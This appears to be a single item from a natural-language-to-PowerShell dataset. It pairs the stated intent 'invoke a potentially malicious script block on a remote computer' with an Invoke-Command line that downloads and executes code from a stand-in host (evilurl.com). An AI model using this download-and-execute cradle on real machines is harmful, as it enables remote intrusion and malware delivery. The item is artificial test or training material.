# Natural language intent:
# Invoke a potentially malicious script block on a remote computer.

Invoke-Command -ComputerName <Remote Computer Name> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evilurl.com/') }
